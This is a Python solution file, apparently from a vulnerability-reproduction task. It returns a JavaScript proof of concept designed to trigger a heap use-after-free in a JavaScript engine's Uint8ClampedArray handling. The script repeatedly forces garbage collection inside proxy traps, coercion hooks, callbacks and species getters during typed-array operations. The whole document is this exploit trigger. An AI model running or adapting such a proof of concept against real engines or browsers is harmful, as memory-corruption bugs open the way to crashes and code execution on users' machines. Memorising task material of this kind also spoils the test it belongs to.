import os
import tarfile
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        # We craft a robust JS PoC that stresses TypedArray operations, particularly Uint8ClampedArray,
        # with GC reentrancy during element access and species construction. This aims to trigger
        # a heap use-after-free if the engine doesn't root 'this' correctly during typed array ops.
        #
        # If gc() is not available in the runtime, we polyfill it to a no-op so the PoC does not fail.
        #
        # We specifically stress Uint8ClampedArray when available, since the vulnerability involves it
        # being implemented incorrectly as separate from TypedArray, leading to potential UAF.
        #
        # The PoC includes multiple attackers:
        # - set() with Proxy array-like invoking gc() during property access
        # - map() with callback invoking gc()
        # - sort() with comparator invoking gc()
        # - slice()/subarray() with arguments invoking gc() via ToInteger conversion hooks
        # - use of species constructor with getters invoking gc()
        #
        # To maximize compatibility with various harnesses, we encapsulate everything and avoid external dependencies.

        js = r"""
// Ensure we have a gc() function; if not, polyfill as no-op.
try {
    if (typeof gc !== "function") { var gc = function() {}; }
} catch (e) {
    // Environments disallowing global var definition should still be fine; define a local alias.
    function gc() {}
}

(function() {
    function NOP() {}
    function safe(fn) {
        try { return fn(); } catch (e) {}
    }
    function tryFinallyTry(fn) {
        try { fn(); } catch (e) {} finally {}
    }
    function blackhole(x) { return x; }

    // Helper: create a numeric coercion that executes GC when coerced to number.
    function makeToNumberWithGC(val) {
        return {
            valueOf() { gc(); return val; },
            toString() { gc(); return "" + val; },
            [Symbol.toPrimitive](hint) { gc(); return val; }
        };
    }

    // Helper: create a proxy array-like object that fires GC on element access/length checks.
    function createArrayLikeProxy(lengthVal, defaultElem) {
        var backing = {};
        // Lazy numeric properties so Reflect.get works, but implement via generic trap.
        var p = new Proxy(backing, {
            has(target, prop) {
                // Cause GC during 'HasProperty' checks
                gc();
                // Pretend every numeric index exists until lengthVal-1
                var n = +prop;
                if (prop === "length") return true;
                if (Number.isFinite(n) && Math.floor(n) === n) {
                    return n >= 0 && n < lengthVal;
                }
                return prop in target;
            },
            get(target, prop, receiver) {
                // GC on every get
                gc();
                if (prop === "length") return makeToNumberWithGC(lengthVal);
                var n = +prop;
                if (Number.isFinite(n) && Math.floor(n) === n) {
                    return defaultElem;
                }
                return Reflect.get(target, prop, receiver);
            },
            getOwnPropertyDescriptor(target, prop) {
                gc();
                if (prop === "length") {
                    return {
                        configurable: true,
                        enumerable: false,
                        writable: true,
                        value: makeToNumberWithGC(lengthVal),
                    };
                }
                var n = +prop;
                if (Number.isFinite(n) && Math.floor(n) === n && n >= 0 && n < lengthVal) {
                    return {
                        configurable: true,
                        enumerable: true,
                        writable: true,
                        value: defaultElem,
                    };
                }
                return Object.getOwnPropertyDescriptor(target, prop);
            },
            ownKeys(target) {
                gc();
                var keys = [];
                for (var i = 0; i < lengthVal; i++) keys.push(String(i));
                keys.push("length");
                return keys;
            }
        });
        return p;
    }

    // Various stressors:

    function stressSet(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(512);
            for (let j = 0; j < a.length; j += 4) a[j] = j & 255;

            let payload = createArrayLikeProxy(256, 7);

            tryFinallyTry(function() {
                // Accessor typedarray set with array-like will continuously call into traps that GC.
                // If 'this' isn't rooted, GC might free 'a' while native copies are in progress.
                T.prototype.set.call(a, payload, 0);
            });

            blackhole(a[0]);
        }
    }

    function stressSetSelfOverlap(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(1024);
            for (let j = 0; j < a.length; j++) a[j] = (j * 3) & 255;

            // Proxy around the typed array itself; reading from it will GC
            let proxy = new Proxy(a, {
                get(target, prop, receiver) {
                    gc();
                    return Reflect.get(target, prop, receiver);
                },
                has(target, prop) {
                    gc();
                    return prop in target;
                }
            });

            tryFinallyTry(function() {
                // Copy from proxy source into same array; internal algorithm may double-buffer or not.
                a.set(proxy, 0);
            });

            blackhole(a[a.length >> 1]);
        }
    }

    function stressMap(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(128);
            for (let j = 0; j < 128; j++) a[j] = (j * 11) & 255;

            tryFinallyTry(function() {
                // Callback that GC's on each element; species constructor path may be exercised.
                let b = a.map(function(v, idx) {
                    gc();
                    return v ^ (idx & 0xff);
                });
                blackhole(b[0]);
            });
        }
    }

    function stressMapWithSpecies(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(64);
            for (let j = 0; j < a.length; j++) a[j] = (j * 7) & 255;

            // Getter for constructor that triggers GC; also a species getter that triggers GC.
            let speciesHolder = function() {};
            Object.defineProperty(speciesHolder, Symbol.species, {
                configurable: true,
                get() {
                    gc();
                    // Return the original constructor; but the GC during retrieval is the trigger.
                    return T;
                }
            });

            // Define 'constructor' as accessor to return our proxy species holder
            Object.defineProperty(a, "constructor", {
                configurable: true,
                get() {
                    gc();
                    return speciesHolder;
                }
            });

            tryFinallyTry(function() {
                let b = a.map(function(v) {
                    gc();
                    return (v + 1) & 255;
                });
                blackhole(b[b.length - 1]);
            });
        }
    }

    function stressSlice(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(256);
            for (let j = 0; j < a.length; j++) a[j] = j & 255;

            // Arguments with GC during ToInteger and ToLength
            let start = makeToNumberWithGC(0);
            let end   = makeToNumberWithGC(a.length);

            tryFinallyTry(function() {
                let b = a.slice(start, end);
                blackhole(b.length);
            });
        }
    }

    function stressSubarray(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(256);
            for (let j = 0; j < a.length; j++) a[j] = (j * 5) & 255;

            // subarray uses ToInteger; coerce numbers with GC.
            let begin = makeToNumberWithGC(5);
            let end   = makeToNumberWithGC(240);

            tryFinallyTry(function() {
                let b = a.subarray(begin, end);
                // Access via proxy to cause GC on element access as well
                let proxy = new Proxy(b, {
                    get(target, prop, receiver) {
                        gc();
                        return Reflect.get(target, prop, receiver);
                    }
                });
                blackhole(proxy[10]);
            });
        }
    }

    function stressSort(T) {
        for (let i = 0; i < 32; i++) {
            let a = new T(96);
            for (let j = 0; j < a.length; j++) a[j] = (Math.random() * 256) | 0;
            tryFinallyTry(function() {
                a.sort(function(x, y) {
                    gc();
                    return (x|0) - (y|0);
                });
                blackhole(a[0]);
            });
        }
    }

    function stressFill(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(128);
            let value = makeToNumberWithGC(0x7f);
            let start = makeToNumberWithGC(1);
            let end   = makeToNumberWithGC(a.length - 1);
            tryFinallyTry(function() {
                a.fill(value, start, end);
                blackhole(a[2]);
            });
        }
    }

    function stressCopyWithin(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(192);
            for (let j = 0; j < a.length; j++) a[j] = (j * 9) & 255;
            let target = makeToNumberWithGC(32);
            let start  = makeToNumberWithGC(0);
            let end    = makeToNumberWithGC(160);
            tryFinallyTry(function() {
                a.copyWithin(target, start, end);
                blackhole(a[33]);
            });
        }
    }

    function stressReduce(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(64);
            for (let j = 0; j < a.length; j++) a[j] = j & 0xff;
            tryFinallyTry(function() {
                let s = a.reduce(function(acc, v) {
                    gc();
                    return (acc + v) & 0xffffffff;
                }, 0);
                blackhole(s);
            });
        }
    }

    function stressBufferSharing(T) {
        // Use two views into the same buffer and trigger GC while copying between them.
        for (let i = 0; i < 64; i++) {
            let buf = new ArrayBuffer(2048);
            let a = new T(buf);
            let b = new T(buf);
            for (let j = 0; j < a.length; j++) a[j] = (j * 13) & 255;

            // Proxy that returns from other view with GC hits
            let proxy = new Proxy(b, {
                get(target, prop, receiver) {
                    gc();
                    return Reflect.get(target, prop, receiver);
                },
                has(target, prop) {
                    gc();
                    return prop in target;
                }
            });

            tryFinallyTry(function() {
                a.set(proxy, 0);
                blackhole(a[1]);
            });
        }
    }

    function stressSpeciesConstructorOnSlice(T) {
        for (let i = 0; i < 64; i++) {
            let a = new T(64);
            for (let j = 0; j < a.length; j++) a[j] = j & 255;

            let speciesHolder = function() {};
            Object.defineProperty(speciesHolder, Symbol.species, {
                configurable: true,
                get() {
                    gc();
                    return T;
                }
            });

            Object.defineProperty(a, "constructor", {
                configurable: true,
                get() {
                    gc();
                    return speciesHolder;
                }
            });

            tryFinallyTry(function() {
                let b = a.slice(0, a.length);
                blackhole(b[10]);
            });
        }
    }

    function stressJoin(T) {
        // While join on typed arrays is not standard (they are not arrays), LibJS historically allowed some patterns.
        // We attempt to get coercion/GC on separator anyway to stress conversions.
        for (let i = 0; i < 16; i++) {
            let a = new T(32);
            for (let j = 0; j < a.length; j++) a[j] = (j * 17) & 255;
            let sep = { toString() { gc(); return ","; }, valueOf() { gc(); return ","; } };
            tryFinallyTry(function() {
                // If not supported, it will throw; we ignore exceptions.
                var s = Array.prototype.join.call(a, sep);
                blackhole(s);
            });
        }
    }

    function stressEvery(T) {
        for (let i = 0; i < 32; i++) {
            let a = new T(128);
            for (let j = 0; j < a.length; j++) a[j] = (j * 19) & 255;
            tryFinallyTry(function() {
                a.every(function(v) {
                    gc();
                    return v >= 0;
                });
            });
        }
    }

    // Determine which types to stress. We prioritize Uint8ClampedArray as the vulnerable target.
    var types = [];
    if (typeof Uint8ClampedArray === "function") types.push(Uint8ClampedArray);
    // Some environments may alias or omit; we avoid broadening to many types to reduce noise.
    // However, if Uint8ClampedArray is missing, we still include Uint8Array to increase the odds of hitting a generic bug path.
    if (types.length === 0 && typeof Uint8Array === "function") types.push(Uint8Array);

    // Run stressors repeatedly to increase reliability.
    for (var round = 0; round < 4; round++) {
        for (var t = 0; t < types.length; t++) {
            var T = types[t];
            // Each stress function is crafted to touch different code paths.
            stressSet(T);
            stressSetSelfOverlap(T);
            stressMap(T);
            stressMapWithSpecies(T);
            stressSlice(T);
            stressSubarray(T);
            stressSort(T);
            stressFill(T);
            stressCopyWithin(T);
            stressReduce(T);
            stressBufferSharing(T);
            stressSpeciesConstructorOnSlice(T);
            stressJoin(T);
            stressEvery(T);
        }
    }

    // Additional targeted hammer: rapidly allocate and throw away instances with GC reentry.
    (function hammer() {
        var T = types[0];
        if (!T) return;
        for (var i = 0; i < 64; i++) {
            safe(function() {
                var a = new T(1024);
                var p = new Proxy(a, {
                    get(t, prop, r) { gc(); return Reflect.get(t, prop, r); }
                });
                T.prototype.set.call(a, p, 0);
            });
        }
    })();

})();
"""
        return js.encode("utf-8")